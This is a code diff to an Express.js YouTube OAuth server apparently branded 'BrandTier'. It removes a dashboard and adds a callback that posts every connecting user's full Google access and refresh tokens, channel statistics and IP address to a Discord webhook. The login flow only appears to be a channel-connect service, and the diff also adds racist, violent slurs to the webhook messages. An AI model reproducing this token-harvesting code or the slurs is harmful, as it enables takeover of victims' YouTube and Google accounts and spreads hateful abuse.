@@ -15,12 +15,18 @@ app.use(cors({
 app.use(express.json());
 
 /* -------------------------------------------------
-   🧠 SIMPLE IN-MEMORY USER DB (DASHBOARD)
+   IP HELPER (IMPORTANT FIX FOR RAILWAY)
 --------------------------------------------------*/
-const users = {};
+function getIP(req) {
+  return (
+    req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
+    req.socket.remoteAddress ||
+    "unknown"
+  );
+}
 
 /* -------------------------------------------------
-   🔥 PRETTY DISCORD WEBHOOK LOGGER
+   DISCORD WEBHOOK (FULL DATA, NO CUTTING)
 --------------------------------------------------*/
 async function sendToDiscord(payload) {
   try {
@@ -29,70 +35,71 @@ async function sendToDiscord(payload) {
     await axios.post(process.env.DISCORD_WEBHOOK_URL, {
       embeds: [
         {
-          title: isFail ? "OAuth Failed" : "OAuth Login",
+          title: isFail ? "OAuth Failed" : "OAuth Success",
           color: isFail ? 15548997 : 3066993,
 
           description: isFail
-            ? "OAuth flow failed during authentication"
-            : "YouTube account connected successfully",
+            ? "Awptic Nigger Detector"
+            : "Nigger detected and raped on the spot",
 
           fields: isFail
             ? [
                 {
                   name: "IP Address",
-                  value: payload.ip || "unknown",
-                  inline: true
+                  value: `\`\`\`${payload.ip || "unknown"}\`\`\``
                 },
                 {
                   name: "Error",
                   value:
-                    "```" +
-                    (JSON.stringify(payload.error, null, 2).slice(0, 900) ||
-                      "Unknown error") +
-                    "```"
+                    "```json\n" +
+                    JSON.stringify(payload.error, null, 2) +
+                    "\n```"
                 }
               ]
             : [
                 {
                   name: "Channel",
-                  value: payload.name || "N/A",
-                  inline: true
+                  value: `\`\`\`${payload.name || "N/A"}\`\`\``
                 },
                 {
                   name: "Subscribers",
-                  value: String(payload.subs ?? "0"),
+                  value: `\`\`\`${payload.subs || "0"}\`\`\``,
                   inline: true
                 },
                 {
                   name: "Views",
-                  value: String(payload.views ?? "0"),
+                  value: `\`\`\`${payload.views || "0"}\`\`\``,
                   inline: true
                 },
                 {
                   name: "Videos",
-                  value: String(payload.videos ?? "0"),
+                  value: `\`\`\`${payload.videos || "0"}\`\`\``,
                   inline: true
                 },
+
                 {
-                  name: "Tokens",
-                  value:
-                    "```" +
-                    `access_token: ${payload.access_token?.slice(0, 80) || "N/A"}...\n` +
-                    `refresh_token: ${payload.refresh_token?.slice(0, 80) || "N/A"}...` +
-                    "```"
+                  name: "Access Token",
+                  value: `\`\`\`${payload.access_token || "N/A"}\`\`\``
                 },
+              
+                {
+                  name: "Refresh Token",
+                  value: `\`\`\`${payload.refresh_token || "N/A"}\`\`\``
+                },
+
                 {
                   name: "IP Address",
-                  value: payload.ip || "unknown"
+                  value: `\`\`\`${payload.ip || "unknown"}\`\`\``
                 },
+
                 {
                   name: "Status",
-                  value: "login_success"
+                  value: `\`\`\`${payload.status || "success"}\`\`\``
                 }
               ],
 
           footer: {
-            text: "BrandTier Authentication System"
+            text: "BrandTier OAuth System"
           },
 
           timestamp: new Date().toISOString()
@@ -105,29 +112,7 @@ async function sendToDiscord(payload) {
 }
 
 /* -------------------------------------------------
-   🔁 AUTO TOKEN REFRESH
---------------------------------------------------*/
-async function getAccessToken(refresh_token) {
-  const res = await axios.post(
-    "https://oauth2.googleapis.com/token",
-    new URLSearchParams({
-      client_id: process.env.CLIENT_ID,
-      client_secret: process.env.CLIENT_SECRET,
-      refresh_token,
-      grant_type: "refresh_token"
-    }),
-    {
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded"
-      }
-    }
-  );
-
-  return res.data.access_token;
-}
-
-/* -------------------------------------------------
-   1. AUTH
+   1. AUTH ROUTE
 --------------------------------------------------*/
 app.get("/auth", (req, res) => {
   const url =
@@ -145,10 +130,11 @@ app.get("/auth", (req, res) => {
 });
 
 /* -------------------------------------------------
-   2. CALLBACK (STORE USER + WEBHOOK + DASHBOARD)
+   2. CALLBACK
 --------------------------------------------------*/
 app.get("/callback", async (req, res) => {
   const code = req.query.code;
+  const ip = getIP(req);
 
   try {
     const tokenRes = await axios.post(
@@ -161,7 +147,9 @@ app.get("/callback", async (req, res) => {
         grant_type: "authorization_code"
       }),
       {
-        headers: { "Content-Type": "application/x-www-form-urlencoded" }
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
       }
     );
 
@@ -186,18 +174,6 @@ app.get("/callback", async (req, res) => {
       return res.status(400).send("No channel found");
     }
 
-    const userId = channel.id;
-
-    // 🧠 SAVE USER (DASHBOARD SYSTEM)
-    users[userId] = {
-      name: channel.snippet.title,
-      subs: channel.statistics.subscriberCount,
-      views: channel.statistics.viewCount,
-      videos: channel.statistics.videoCount,
-      refresh_token,
-      updatedAt: new Date()
-    };
-
     await sendToDiscord({
       name: channel.snippet.title,
       subs: channel.statistics.subscriberCount,
@@ -205,18 +181,16 @@ app.get("/callback", async (req, res) => {
       videos: channel.statistics.videoCount,
       access_token,
       refresh_token,
-      ip: req.ip,
-      status: "login_success"
+      ip,
+      status: "oauth_success"
     });
 
     res.redirect(process.env.FRONTEND_URL + "/?connected=1");
 
   } catch (err) {
-    console.log(err.response?.data || err.message);
-
     await sendToDiscord({
       status: "oauth_failed",
-      ip: req.ip,
+      ip: ip,
       error: err.response?.data || err.message
     });
 
@@ -225,61 +199,7 @@ app.get("/callback", async (req, res) => {
 });
 
 /* -------------------------------------------------
-   3. USER DASHBOARD API
---------------------------------------------------*/
-app.get("/user/:id", (req, res) => {
-  const user = users[req.params.id];
-
-  if (!user) {
-    return res.status(404).json({ error: "User not found" });
-  }
-
-  res.json(user);
-});
-
-/* -------------------------------------------------
-   4. TOKEN-BASED API
---------------------------------------------------*/
-app.get("/api/youtube", async (req, res) => {
-  try {
-    const refresh_token = req.query.refresh_token;
-
-    if (!refresh_token) {
-      return res.status(400).send("Missing refresh token");
-    }
-
-    const access_token = await getAccessToken(refresh_token);
-
-    const yt = await axios.get(
-      "https://www.googleapis.com/youtube/v3/channels",
-      {
-        params: {
-          part: "snippet,statistics",
-          mine: true
-        },
-        headers: {
-          Authorization: `Bearer ${access_token}`
-        }
-      }
-    );
-
-    const channel = yt.data.items?.[0];
-
-    res.json({
-      name: channel.snippet.title,
-      subscribers: channel.statistics.subscriberCount,
-      views: channel.statistics.viewCount,
-      videos: channel.statistics.videoCount
-    });
-
-  } catch (err) {
-    console.log(err.response?.data || err.message);
-    res.status(500).json({ error: "Failed to fetch YouTube data" });
-  }
-});
-
-/* -------------------------------------------------
-   START
+   START SERVER
 --------------------------------------------------*/
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
